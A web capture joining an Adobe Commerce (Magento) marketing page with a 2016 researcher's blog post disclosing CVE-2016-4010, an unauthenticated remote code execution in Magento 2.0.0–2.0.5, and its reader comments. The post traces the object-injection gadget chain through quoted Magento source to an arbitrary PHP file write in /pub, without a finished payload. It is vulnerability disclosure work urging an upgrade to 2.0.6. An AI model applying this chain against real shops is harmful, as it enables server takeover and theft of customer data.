![https://main--bacom--adobecom.hlx.page/au/customer-success-stories/krispy-kreme-case-study | Krispy Kreme customer story](./media_110bc19ee2605a4da99f118f689e100bcb0eac01c.png?width=750&format=png&optimize=medium)

**Nearly doubled brand conversion rates year-over-year.**

style
XL spacing, three up, grid-width-10, center

## Recommended for you

[https://main--bacom--adobecom.hlx.page/fragments/products/cards/commerce](/fragments/products/cards/commerce)

style
Center, xl-spacing

## Questions? We have answers.

**What is inventory management?**

[Inventory management](https://business.adobe.com/blog/basics/inventory-management#_blank#_dnt) refers to the processes a business uses to acquire, store, track, and ship items it sells. It involves managing a physical space (typically a warehouse) where inventory is stored, as well as the people and processes necessary for moving items through that space.

**What is headless commerce?**

[Headless commerce](https://business.adobe.com/blog/basics/a-complete-guide-to-headless-ecommerce#_dnt) is a commerce architecture that decouples (or detaches) the front end of your online store from the operational back-end layer that manages sales, website security, data processes, and business logic. The primary benefits of headless commerce are improved personalization across omnichannel touchpoints, scalability, and quicker time to market.

**What are ecommerce product recommendations?**

[Ecommerce product recommendations](https://business.adobe.com/blog/basics/guide-to-product-recommendations#_dnt) are product listings on a digital commerce website that are customized for individual users based on behavioral data with the aim of driving product awareness, increasing average order value (AOV), and improving brand loyalty.

**What is ecommerce ERP integration?**

[Ecommerce ERP (enterprise resource planning) integration](/products/magento/erp-integration) refers to integrating your ERP system with your digital commerce store to increase efficiencies by syncing inventory, orders, customer data, and shipping details between your key business systems.

**What is personalization at scale?**

[Personalization at scale](https://business.adobe.com/blog/how-to/personalization-at-scale-has-never-been-more-crucial-for-your-business#_blank#_dnt) means your business has the ability to personalize any and every customer touchpoint based on immediate context as well as previously observed behavior. The ultimate purpose is to present the most relevant and personalized experience possible every time, in real time.

style
xl-spacing

title
Magento, now Adobe Commerce

CardDescription

cardDate
2023-07-11

cardImage

![Adobe Commerce](./media_1a62272c85bb4be7986431b230ab7c85ceb86ed65.png?width=750&format=png&optimize=medium)

primaryTag
caas:content-type/product-page

Tags
caas:content-type/product-page, caas:products/adobe-commerce

### **Registration is open for Adobe Summit 2025. Join us March 17–20.**

**Registration is open for Adobe Summit 2025. Join us March 17–20.**

### **Register now**

**Register now**

### **ADOBE COMMERCE (MAGENTO)**

**ADOBE COMMERCE (MAGENTO)**

### **The experience makes all the difference. Grow with Adobe Commerce.**

**The experience makes all the difference. Grow with Adobe Commerce.**

### **Watch overview**

**Watch overview**

### **A customized commerce solution to get you where you want to grow.**

**A customized commerce solution to get you where you want to grow.**

### **Boost conversions by tapping into powerful tools.**

**Boost conversions by tapping into powerful tools.**

### **Learn more**

**Learn more**

### **Manage multiple brands across channels and audiences while growing into new territory.**

**Manage multiple brands across channels and audiences while growing into new territory.**

### **An enterprise platform designed for endless growth.**

**An enterprise platform designed for endless growth.**

### **Get site performance, reliability, and speed — no matter the size of your business.**

**Get site performance, reliability, and speed — no matter the size of your business.**

### **Power deeper personalization with integrated Adobe Experience Cloud solutions.**

**Power deeper personalization with integrated Adobe Experience Cloud solutions.**

### **The latest innovations from Adobe Commerce.**

**The latest innovations from Adobe Commerce.**

### **Composable commerce built for business.**

**Composable commerce built for business.**

### **Give IT a sophisticated platform for innovation.**

**Give IT a sophisticated platform for innovation.**

### **Empower commerce teams to reach new audiences.**

**Empower commerce teams to reach new audiences.**

### **Apps and extensions to expand your commerce capabilities.**

**Apps and extensions to expand your commerce capabilities.**

### **Visit Marketplace**

**Visit Marketplace**

### **We help global brands do big things.**

**We help global brands do big things.**

### **5% increase in conversion rate.**

**5% increase in conversion rate.**

### **50% increase in traffic year-over-year.**

**50% increase in traffic year-over-year.**

### **Nearly doubled brand conversion rates year-over-year.**

**Nearly doubled brand conversion rates year-over-year.**

### **Recommended for you**

**Recommended for you**

### **Questions? We have answers.**

**Questions? We have answers.**

### **What is inventory management?**

**What is inventory management?**

### **Inventory management**

**Inventory management**

### **What is headless commerce?**

**What is headless commerce?**

### **Headless commerce**

**Headless commerce**

### **What are ecommerce product recommendations?**

**What are ecommerce product recommendations?**

### **Ecommerce product recommendations**

**Ecommerce product recommendations**

### **What is ecommerce ERP integration?**

**What is ecommerce ERP integration?**

### **Ecommerce ERP (enterprise resource planning) integration**

**Ecommerce ERP (enterprise resource planning) integration**

### **What is personalization at scale?**

**What is personalization at scale?**

### **Personalization at scale**

**Personalization at scale**

![](https://business.adobe.com/akam/13/pixel_7811f5de?a=dD1lMjAzZTBjNzE2NjkxYmRmZDY1YWU0NGU5YWQ4NDVmNjRmODM2Y2I3JmpzPW9mZg==)

=== Content from www.netanelrub.in_2d0162c2_20250126_045952.html ===

[Skip to content](#content)
# [0-Days And Life](https://www.netanelrub.in/ "0-Days And Life")

## // @DEBUG: This should never happen

Primary Menu

* [[Home](/)](https://www.netanelrub.in/home/)
* [CVE List](https://www.netanelrub.in/cves-list/)
* [Presentations](https://www.netanelrub.in/presentations/)

# Magento – Unauthenticated Remote Code Execution

Posted on [May 17, 2016May 18, 2016](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/) by [Netanel Rubin](https://www.netanelrub.in/author/na7irub/)

The vulnerability (CVE-2016-4010) allows an attacker to execute PHP code at the vulnerable Magento server unauthenticated. This vulnerability actually consists of many small vulnerabilities, as described further in the blog post.

Magento is an extremely popular eCommerce platform with a 30% share in the eCommerce market.

It is used by major corporations, such as Rosetta Stone, Nike, BevMo and Dyson, and by small online merchants alike. All in all, Magento is used in 250,000 online shops, handling approximately **50 Billion dollars a year**.

These statistics, along with the fact Magento stores almost all customer information, makes it an extremely sensitive target, and the main reason I audited it [once more](http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/).

The vulnerability assumes one of the RPCs (REST or SOAP) is enabled. As both are enabled by default, and one of them is actually required by the system, this assumption will not be a problem in the absolute majority of installations.

In this document I will use the SOAP API, as XML is more readable in this case.

This vulnerability works on both the Community Edition and Enterprise Edition of the system.

I recommend all Magento administrators to update their installations to the [2.0.6 patch](https://magento.com/security/patches/magento-206-security-update).

**Vulnerable Versions**

Magento EE & CE before 2.0.6.

**Technical Description**

**The Good**

Since the [last time](http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) I audited Magento’s code, a lot has changed. Most of the code has been re-written, the directories structure changed, and the security mechanisms improved.

So, naturally, I was quite happy auditing this massive codebase again.

The first thing I noticed while going through the code was the vast improvement to the system’s OOP structure. Almost every class in the system implemented at least one interface, inherited from a parent class, and used some advanced magic-method, such as ‘*\_\_call()*’ or ‘*\_\_get()*’ to better expose private properties.

Of course, while being a huge step-forward, this extreme example of OOP implementation also complicated things quite a bit – both for me as a researcher, and for Magento developers.

Now, when a developer is writing a new class, it is forced to inherit, or implement, a different class or interface, written by another developer. While this happens quite a lot in the software development world, the security implications of this work-methodology has greatly increased in this particular system – a result of the very dynamic code flow, and, unfortunately, the very dynamic API.

Magento, at its core, is a system built by different “modules”. These so called “modules” are basically different directories containing code for different functionalities the system offers. For example, there’s a module responsible for the payment, one that’s responsible for the virtual cart and one responsible for the customers.

In each module there’s a special directory named “*API*”. This directory contains all the functionality the module exports to other modules. That way the payment module can communicate with the cart module, the customer module with the authorization module, or the shipping module with the sales module, naming a few examples.

The “*API*” directory is made out of different PHP files, each containing one PHP class, responsible for exposing some of the module functionality to the rest of the system. Most of the modules API functionality is restricted to other system controlled modules only, as most of it is sensitive.

But, some of the API calls has also been made accessible to another, more user controlled, module – the notorious Web API.

Magento’s Web API is allowing two different RPCs – a REST RPC, and a SOAP API. Both RPCs provide the same functionality, the only difference between the two is that one is using JSON and the HTTP query string to handle its input, while the other uses XML envelopes.

As both are enabled by default, I will use SOAP API in this document as I find it more understandable.

**The Bad**

Without a doubt in my mind, I can safely say Magento features one of the most comprehensive APIs I have ever seen in a PHP CMS, or really any kind of CMS at all.

In order to expose just part of each module’s API, Magento has provided module developers a convenient way of declaring which parts of their module’s API they want to make accessible to the Web API – the “*webapi.xml*” file.

The *“webapi.xml”* file contains all the classes and methods exposed to the Web API, in a neat, organized, XML structure. Each exposed method also specifies the specific privilege level it requires.

These privileges can range from “anonymous” – allowing anyone (even guests) to access the method, to “self” – allowing access only to registered customers, and to specific, admin-only, privileges, such as the “*Magento\_Backend::admin*” privilege – allowing access only to administrators with capabilities of editing the server configuration values.

While granting module developers a convenient way of communicating between the front-end of the system and its back-end, the Web API, using the “*webapi.xml”* file, also opens another door leading directly into the module’s core.

As we will assume the role of guests in the store, we will only be able to access methods requiring the “*anonymous*” privilege. This will greatly narrow our attack surface, but will remove the requirement for any special preconditions.

Surprisingly, even with “anonymous” privileges we could still use very dynamic input types. I’m not referring to the regular XMLRPC input types alone, such as arrays or base64 decoded strings, I’m also referring to different objects available in the system. For example, the “CustomerRepositoryInterface::save()” API function allows us to use a “CustomerInterface” object in the “$customer” variable, as can be seen in the following prototype:

```

interface CustomerRepositoryInterface
{
    /**
     * Create customer.
     */
    public function save(\Magento\Customer\Api\Data\CustomerInterface $customer);

}

```

How can objects be created using the RPC interface? Interestingly enough, the answer to that question relies in how Magento configured their SOAP server.

Magento uses the default SOAP server that is bundled by default with PHP – “SoapServer”. In order to be properly configured, “SoapServer” requires a WSDL file, which describes all the methods, arguments, and custom types used in the particular RPC request.

Magento generates a different WSDL file for every module supporting XMLRPC functionality, setting its data directly from the module’s “webapi.xml” file.

When an RPC request is parsed by the server, the server uses the data found in the WSDL file to decide whether the request is valid or not, checking the requested method, its arguments, and their types. If the request is valid, it passes the parsed request object back to Magento for further parsing.

It is important to note that “SoapServer” does not interact with Magento in any way – all the information it has about the module’s methods and arguments comes from the WSDL file alone.

At this point, the request sent is still made out of nested arrays – no objects were created during SoapServer’s parsing phase.

In order to create the required objects, Magento continues to handle the input itself.

Magento obtains the prototype (can be seen in the previous code example) of the method requested in order to extract its argument names and data types.

For basic cases, such as strings, arrays, booleans and so on, the system just casts the input into the appropriate type. But for objects, the solution is a bit trickier.

If the argument data type is an instance of a class, Magento will try and create that instance using the supplied input. Remember that at this point the input is just a dictionary – its keys are the properties names and values are the properties values.

First, Magneto will create a new instance of the required class. Then, it will try and populate it using the following algorithm:

1. Get a property name (from the input dictionary keys)
2. Look for a public method named “Set[NAME]()”, where [NAME] is the property name
3. If there is such a method, execute it using the property value as an argument.
4. If there isn’t, ignore the property and continue to the next one

Magento will follow this algorithm for every potential property the user is trying to set. When all properties have been checked, Magento will assume the instance is ready and it will move to the next argument.

When all arguments are dealt with, Magento will then finally execute the API method.

Let me clarify that part – Magento lets you create an object, set its public properties, and execute any method starting with the “Set” prefix through its RPC.

Surprisingly, this behavior will be Magento’s downfall.

**The ugly**

Some API calls allow us to set specific information in our shopping cart. Such information can be our shipping address, products, and even our payment method.

When Magento sets our information safely inside the shopping cart instance, it uses the “save” function of that instance in order to store the newly inserted data in the database.

Let’s have a look at how the “save” function looks like:

```

/**
 * Save object data
 */
public function save(\Magento\Framework\Model\AbstractModel $object)
{
    ...
    // If the object is valid and can be saved
    if ($object->isSaveAllowed()) {
        // Serialize whatever fields need serializing
        $this->_serializeFields($object);
        ...
        // If the object already exists in the DB, update it
        if ($this->isObjectNotNew($object)) {
            $this->updateObject($object);
        // Otherwise, create a new record
        } else {
            $this->saveNewObject($object);
        }

        // Unserialize the fields we serialized
        $this->unserializeFields($object);
    }
    ...
    return $this;
}

// AbstractDb::save()

```

Magento makes sure our object is valid, serializes any fields that should be serialized, stores it in the database, and finally it unserializes the fields it previously serialized.

Sounds simple, right?

Nope.

Let’s have a look at how Magento decides which fields it should **serialize**:

```

/**
 * Serialize serializable fields of the object
 */
protected function _serializeFields(\Magento\Framework\Model\AbstractModel $object)
{
    // Loops through the '_serializableFields' property
    // (containing hardcoded fields that should be serialized)
    foreach ($this->_serializableFields as $field => $parameters) {
        // Get the field's value
        $value = $object->getData($field);

        // If it's an array or an object, serialize it
        if (is_array($value) || is_object($value)) {
            $object->setData($field, serialize($value));
        }
    }
}

// AbstractDb::_serializeFields()

```

As can be seen, only fields appearing in the hard-coded dictionary “\_serializableFields” can be serialized. On top of that, the method makes sure the field’s value is an array or an object before it continues to serialize it.

Now, let’s have a look at how Magento decided which fields it should **unserialize**:

```

/**
 * Unserialize serializeable object fields
 */
public function unserializeFields(\Magento\Framework\Model\AbstractModel $object)
{
    // Loops through the '_serializableFields' property
    // (containing hardcoded fields that should be serialized)
    foreach ($this->_serializableFields as $field => $parameters) {
        // Get the field's value
        $value = $object->getData($field);

        // If it's not an array or an object, unserialize it
        if (!is_array($value) && !is_object($value)) {
            $object->setData($field, unserialize($value));
        }
    }
}

// AbstractDb::unserializeFields ()

```

Well, it’s pretty much the same. The only difference is that this time Magento makes sure the field’s value is **not** an array or an object.

Because of these two checks, we can exploit an object injection attack – simply by setting a regular string to a serializable field.

When we set a regular string to a serializable field, the system will not serialize it before the object is stored in the database, as it is **not** an object or an array. But when the system will try to unserialize it, right after the database queries has been executed, it **will** be unserialized, as it is **not** an object or an array.

This small, almost invisible, condition, makes the difference between a vulnerable and a secure system.

The only questions remaining are which fields are considered “serializable”, and how can we set them.

The first question is easy – we just need to search which classes define the “\_serializableFields” property.

Quickly enough, I found several classes that define serializable fields, but none of them could be created using our beloved XMLRPC.

To be honest, one of these classes – “Payment” (which is responsible for gathering information about the payment details), does appear in one of the API methods, but not as an argument, so I couldn’t create or control its instance properties.

On top of that, its serializable field – “additional\_information”, can only be set as an array using the regular “Set[PROPERTY\_NAME]” technique as an extra security measure, so not only we can’t create it, we wouldn’t be able to set it as a string even if we could.

But it can be set in another tricky way.

When Magento sets the properties of the argument instance, it doesn’t actually set its properties. Instead, it stores them in a dictionary named “\_data”. This dictionary is then being used in almost all cases where an instance property is needed.

In our case, this means that our serializable field – “additional\_information”, is actually being stored inside that dictionary rather than as a regular property.

As a result, if we could control the “\_data” dictionary entirely, we could bypass the “additional\_information” field array restriction, as we will set it manually rather than call “Set[PROPERTY\_NAME]”.

But how can we control this sensitive dictionary?

Well, one of the things Magento does before saving our “Payment” instance is to edit its properties. Magento does that by treating our API input as payment information that is needed to be stored in the “Payment” instance. This can be seen in the following API method:

```

/**
 * Adds a specified payment method to a specified shopping cart.
 */
public function set($cartId, \Magento\Quote\Api\Data\PaymentInterface $method)
{

    $quote = $this->quoteRepository->get($cartId); // Get the cart instance
    $payment = $quote->getPayment(); // Get the payment instance

    // Get the data from the user input
    $data = $method->getData();

    // Check for additional data
    if (isset($data['additional_data'])) {
        $data = array_merge($data, (array)$data['additional_data']);
        unset($data['additional_data']);
    }

    // Import the user input to the Payment instance
    $payment->importData($data);

    ...
}

// PaymentMethodManagement::set()

```

As can be seen, the “Payment” data is retrieved with a call to “$method->getData()”, which returns the “\_data” property from the “$method” variable. Keep in mind that because “$method” is an argument in an API method, we are in control of it.

When Magneto calls “getData()” on our “$method” argument, the “\_data” property of that argument is returned, containing all the payment information we inserted.

Later, it calls “importData()” with our “\_data” property as input, replacing the “Payment” instance “\_data” property with our “\_data” property.

This is a huge step forward. We can now replace the sensitive “\_data” property in the “Payment” instance with our user controlled “\_data” property, which means we can now set the “additional\_information” field.

The problem is that for our unserialize() to work we need that field set to a string, but the “Set[PROPERT\_NAME]” method only allows it to be an array.

Surprisingly, though, the solution lies two lines of code before the “importData()” call.

Magento, in its constant effort of becoming the most dynamic CMS ever created, allows developers to add their own payment methods, requiring their own data and information. In order to do that, Magento uses our user-controlled “additional\_data” field.

The “additional\_data” field is a dictionary containing more data for the payment method, completely controlled by the user. In order for that custom data to be part of the original data, **Magento merges the “additional\_data” dictionary with the original “data” dictionary**, effectively allowing the “additional\_data” dictionary to override any value in the “data” dictionary, basically letting it completely override it.

This means that now, after the two dictionaries merged, the user controlled “additional\_data” dictionary now became the argument’s “\_data” dictionary, and because of “importData()”, **it now becomes the “Payment” instance sensitive “\_data” property**.

Which means we can now completely control the serializable field “additional\_information” and **exploit an Object Injection Attack**.

**And the unserializable**

Now, that we can unserialize any string we wanted, it’s time to exploit the Object Injection.

First, we will need an object with a “\_\_wakeup()” or “\_\_destruct()” method, so it will be automatically called when the object is unserialized or destroyed. We require such methods because even though we can control the object properties, we can’t call any of its methods. This is why we have to rely on PHP’s magical methods, which are called automatically when certain events occur.

The first object we will use will be an instance of the “Credis\_Client” class, which contains these methods:

```

/*
 * Called automaticlly when the object is destrotyed.
 */
public function __destruct()
{
    if ($this->closeOnDestruct) {
        $this->close();
    }
}

/*
 * Closes the redis stream.
 */
public function close()
{
    if ($this->connected && ! $this->persistent) {
            ...
            $result = $this->redis->close();
    }
    ...
}

// Credis_Client::__destruct(), close()

```

As can be seen, the class does have a simple \_\_”destruct()” method (that will be automatically called by PHP when the object is destroyed), which simply calls the “close()” method.

“close()”, on the other hand, is more interesting – if “close()” recognizes that there is an active connection to a Redis server, it tries to close it by calling the “close()” method on the “redis” property.

Because “unserialize()” allows us to control all the object properties, we control the “redis” property too. Because of that, we can set any object we’d like into that property (not just a Redis one), and affectively, call any “close()” method in any class in the system.

This greatly expands our attack surface. There are several “close()” methods in Magento, and because “close()” methods are usually responsible for terminating streams, closing file handles, and storing object data, we can expect some interesting calls in some of them.

And, as expected, I did find some interesting calls. Let’s have a look at the “close()” method of the “Transaction” class:

```

/**
 * Close this transaction
 */
public function close($shouldSave = true)
{
    ...
    if ($shouldSave) {
        $this->save();
    }
    ...
}

/**
 * Save object data
 */
public function save()
{
    $this->_getResource()->save($this);
    return $this;
}

// Magento\Sales\Model\Order\Payment\Transaction::__destruct(), close()

```

Both of these methods are pretty simple. The “close()” method calls the “save()” method, which then calls the “save()” method of the “\_resource” property.

Using the same logic we used before, because we control the “\_resource” property we can control its class too, so we can call any “save()” method in any class we’d like.

That’s a huge step forward. As can be guessed, “save()” methods are usually responsible for storing some kind of data in some kind of storage – the file system, a database, and so on. All we have to do now is look for a “save()” method which uses the file system as its storage utility.

And, quickly enough, I found one:

```

/**
 * Try to save configuration cache to file
 */
public function save()
{
    ...
    // save stats
    file_put_contents($this->getStatFileName(), $this->getComponents());
    ...
}

// Magento\Framework\Simplexml\Config\Cache\File::save()

```

All this method does is store what’s inside the “components” field into a file. As the file path is retrieved from the “stat\_file\_name” field, and because we control these two fields, we effectively control both the file path and its content, **which results in an arbitrary file write vulnerability**.

All we have to do now is find a good path to write our file in, one that has to be writeable by the server and accessible via the web.

One such path is the “/pub” directory, available in all Magento installations. Magento uses that directory in order to store any images or public files an administrator uploaded, and as such, it has to be writeable by the server.

More importantly, because that directory usually stores images, which needs to be retrieved by the browser, it is accessible through the regular web interface.

Finally, we just need to write some PHP code, give our file name a “.php” extension, and we’re good to go. **We’ve executed arbitrary PHP code on the server unauthenticated.**

### Share!

* [Click to share on Twitter (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=twitter "Click to share on Twitter")
* [Click to share on Facebook (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=facebook "Click to share on Facebook")
* [Click to share on Google+ (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=google-plus-1 "Click to share on Google+")
* [Click to share on Reddit (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=reddit "Click to share on Reddit")
* [Click to share on LinkedIn (Opens in new window)](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/?share=linkedin "Click to share on LinkedIn")

### *Related*

Posted in [0-Days](https://www.netanelrub.in/category/0-days/), [Magento](https://www.netanelrub.in/category/magento/), [PHP](https://www.netanelrub.in/category/php/), [RCE](https://www.netanelrub.in/category/rce/)

## Post navigation

[TWiki – Arbitrary File Upload (Windows)](https://www.netanelrub.in/2016/04/29/twiki-arbitrary-file-upload-windows/)[Magento – Re-Installation & Account Hijacking Vulnerabilities](https://www.netanelrub.in/2016/07/01/magento-re-installation-account-hijacking-vulnerabilities/)

## 34 thoughts on “Magento – Unauthenticated Remote Code Execution”

1. Pingback: [Magento – Unauthenticated Remote Code Execution – sec.uno](https://www.sec.uno/2016/05/17/magento-unauthenticated-remote-code-execution/)
3. Pingback: [5月18日-每日安全知识热点 – News Republic of World](http://news.securemymind.com/2016051831973.html)
5. Pingback: [Magento attacks uncanny hacks-men with shopper-popper patch (The Register) – sec.uno](https://www.sec.uno/2016/05/18/magento-attacks-uncanny-hacks-men-with-shopper-popper-patch-the-register/)
7. ![](https://secure.gravatar.com/avatar/68c28ddcb1263e09482439dc295b4769?s=32&d=retro&r=g) **naltor** says:
   [May 18, 2016 at 11:13 am](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-7)

   Awesome man!!!

   Just a question, does this vulnerabilities affect to Magento v1.x ?

   Regards

   [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=7#respond)
   1. ![](https://secure.gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=32&d=retro&r=g) **[Netanel Rubin](http://netanelrub.in/)** says:
      [May 18, 2016 at 11:16 am](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-8)

      I believe not.

      [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=8#respond)
   3. ![](https://secure.gravatar.com/avatar/c3895b6b499c0775bd05df002c42d7cd?s=32&d=retro&r=g) **therochworks** says:
      [July 25, 2016 at 10:57 am](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-171)

      The attack vector described by Netanel is not useable in Magento 1.x.

      [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=171#respond)
9. Pingback: [CVE-2016-4010 -A critical bug can fully compromise a Magento shopSecurity Affairs](http://securityaffairs.co/wordpress/47439/hacking/cve-2016-4010-magento-flaw.html)
11. Pingback: [CVE-2016-4010 – Watch out a critical bug can fully compromise your Magento shop – sec.uno](https://www.sec.uno/2016/05/18/cve-2016-4010-watch-out-a-critical-bug-can-fully-compromise-your-magento-shop/)
13. Pingback: [CVE-2016-4010 – Watch out a critical bug can fully compromise your Magento shop - Systerity](http://systerity.com/blog/cve-2016-4010-watch-out-a-critical-bug-can-fully-compromise-your-magento-shop/)
15. ![](https://secure.gravatar.com/avatar/fc541fdb90c5cc047c8ab5b3723af0fe?s=32&d=retro&r=g) **AC** says:
    [May 18, 2016 at 3:16 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-12)

    Awesome! Nice detailed explanation.

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=12#respond)
17. ![](https://secure.gravatar.com/avatar/a420fff8b08c42444526b097eb657d27?s=32&d=retro&r=g) **Daniel Z** says:
    [May 18, 2016 at 8:39 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-14)

    you are a really smart guy

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=14#respond)
19. Pingback: [Magento ออก Patch 2.0.6 อุดช่องโหว่ความรุนแรงระดับสูง เตือนผู้ใช้งานทำการ Patch โดยด่วน – TechTalkThai](https://www.techtalkthai.com/magento-releases-critical-remote-code-execution-patch-2-0-6/)
21. Pingback: [60 miliardów dolarów, Magento i nieuwierzytelnione wykonanie kodu w popularnej platformie e-commerce](http://sekurak.pl/60-miliardow-dolarow-magento-i-nieuwierzytelnione-wykonanie-kodu-w-popularnej-platformie-e-commerce/)
23. Pingback: [CVE-2016-4010 – Watch out a critical bug can fully compromise your Magento shop - OSINT](http://opensources.info/cve-2016-4010-watch-out-a-critical-bug-can-fully-compromise-your-magento-shop/)
25. Pingback: [Achtung Magento-Nutzer: Patch 2.0.6 einspielen | goneo Blog -Infos zu Hosting, Server, Software](http://intern.goneoblog.de/2016/05/19/achtung-magento-nutzer-patch-2-0-6-einspielen/)
27. Pingback: [Magento flaw allowed hackers to execute code using APIs | hacker samurai](http://hackersamurai.com/magento-flaw-allowed-hackers-to-execute-code-using-apis/)
29. Pingback: [Federal Procurement Regs Adopt Simple Security Controls (May 16, 2016) (SANS Newsbites) – sec.uno](https://www.sec.uno/2016/05/20/federal-procurement-regs-adopt-simple-security-controls-may-16-2016-sans-newsbites/)
31. Pingback: [Weekendowa Lektura 2016-05-20 – bierzcie i czytajcie | Zaufana Trzecia Strona](https://zaufanatrzeciastrona.pl/post/weekendowa-lektura-2016-05-20-bierzcie-i-czytajcie/)
33. Pingback: [Magento2 – 能够完全控制网店的漏洞 | 神刀安全网](http://www.shellsec.com/news/21121.html)
35. ![](https://secure.gravatar.com/avatar/f567cde58798a3b5e3efd74285e4b531?s=32&d=retro&r=g) **Brian** says:
    [May 22, 2016 at 6:41 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-39)

    Thanks for the sharing. I just tried to reproduce this vuln but I failed. The below is my testings:

    1. Magento 1.9

    2. Magento 1.8

    3. Magento 1.7

    4. Magento 2 (<https://github.com/magento/magento2/tree/develop>)

    Could you please tell me which version is vulnerable? Really appreciate that.

    Thanks,

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=39#respond)
    1. ![](https://secure.gravatar.com/avatar/99cb247fbda26925ea2593a87bcc61b0?s=32&d=retro&r=g) **[Netanel Rubin](http://netanelrub.in/)** says:
       [May 22, 2016 at 6:45 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-40)

       As mentioned above, the vulnerable versions are 2.0.0 – 2.0.5 (included).

       [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=40#respond)
       1. ![](https://secure.gravatar.com/avatar/21264e5f7cc6b591b250438fcd85bb4b?s=32&d=retro&r=g) **[Daniel](http://decrypted.de)** says:
          [May 24, 2016 at 2:47 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-46)

          Hey,

          you never mentioned before that it really is only 2.x, also reporting about that very important detail was and is very bad.

          Even <https://magento.com/security/patches/magento-206-security-update> is not 100% clear on the matter with sayings like everything below 2.0.6.

          Thx for your efforts! Maybe thats a really interesting talking point to get right for a next time.

          [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=46#respond)
37. Pingback: [Magento未授权远程代码执行漏洞(CVE-2016-4010)的分析与利用 | 安全小飞侠的窝](http://avfisher.win/archives/529)
39. Pingback: [Magento 2.0.5 Remote Code Execution (RCE) - Byte Blog](https://www.byte.nl/blog/magento-2-0-5-remote-code-execution-rce)
41. Pingback: [Magento 2.0.6 Unserialize Remote Code Execution | LoneRanger](https://lonerangerweb.wordpress.com/2016/06/06/magento-2-0-6-unserialize-remote-code-execution/)
43. Pingback: [Inside Out Security Show Episode #9](https://blog.varonis.com/inside-out-security-show-episode-nine/)
45. Pingback: [Check Point discovers three Zero-Day Vulnerabilities in web programming language PHP 7 | Check Point Blog](http://blog.checkpoint.com/2016/12/27/check-point-discovers-three-zero-day-vulnerabilities-web-programming-language-php-7/)
47. Pingback: [[Alert] New Magento Vulnerability – Unauthenticated Remote Code Execution | Information Security, latest Hacking News, Cyber Security, Network Security](https://www.securityglobal24h.com/alert-new-magento-vulnerability-unauthenticated-remote-code-execution/general/news/Information-Security-latest-Hacking-News-Cyber-Security-Network-Security)
49. Pingback: [Magento flaw allowed hackers to execute code using APIs | SC Media](https://www.scmagazine.com/home/news/magento-flaw-allowed-hackers-to-execute-code-using-apis/)
51. Pingback: [[Alert] Tính dễ bị tổn thương Magento mới – Thực thi mã từ xa không được xác thực | Top - Tin tức an ninh mạng nhanh nhất Việt Nam](http://anninhmang24h.com/alert-tinh-de-bi-ton-thuong-magento-moi-thuc-thi-ma-tu-xa-khong-duoc-xac-thuc/)
53. Pingback: [Critical SQL Injection & RCE Vulnerabilities Discovered in Magento - Fixed](https://www.getastra.com/blog/cms/magento-security/magento-sqli-vulnerability-disclosed-in-versions-2-1-2-2-2-3/)
55. Pingback: [Magento CMS 2.20 前台SQLI - 黑客圈](https://www.hackquan.com/article/hacker-technology/2350.html)
57. ![](https://secure.gravatar.com/avatar/877da7df00dea8b65322f7de030b6277?s=32&d=retro&r=g) **Awist** says:
    [August 11, 2020 at 5:07 pm](https://www.netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/#comment-82386)

    you are a really smart guy

    [Reply](/2016/05/17/magento-unauthenticated-remote-code-execution/?replytocom=82386#respond)
59. Pingback: [[Alert] New Magento Vulnerability - Unauthenticated Distant Code Execution - Hostor Infotech %](http://hostor.xyz/alert-new-magento-vulnerability-unauthenticated-distant-code-execution/)

### Leave a Reply [Cancel reply](/2016/05/17/magento-unauthenticated-remote-code-execution/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

Save my name, email, and website in this browser for the next time I comment.

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

Search for:

# Follow Me

* [View @na7irub’s profile on Twitter](https://twitter.com/%40na7irub/)
* [View na7irub’s profile on LinkedIn](https://www.linkedin.com/in/na7irub/)
# Categories

* [0-Days](https://www.netanelrub.in/category/0-days/)
* [ACS](https://www.netanelrub.in/category/acs/)
* [Magento](https://www.netanelrub.in/category/magento/)
* [MediaWiki](https://www.netanelrub.in/category/mediawiki/)
* [Moodle](https://www.netanelrub.in/category/moodle/)
* [Node.JS](https://www.netanelrub.in/category/node-js/)
* [Perl](https://www.netanelrub.in/category/perl/)
* [PHP](https://www.netanelrub.in/category/php/)
* [RCE](https://www.netanelrub.in/category/rce/)
* [TWiki](https://www.netanelrub.in/category/twiki/)

[Proudly powered by WordPress](http://wordpress.org/)
 |
Theme: sosimple by [Fernando Villamor Jr.](http://fernandovillamorjr.com).


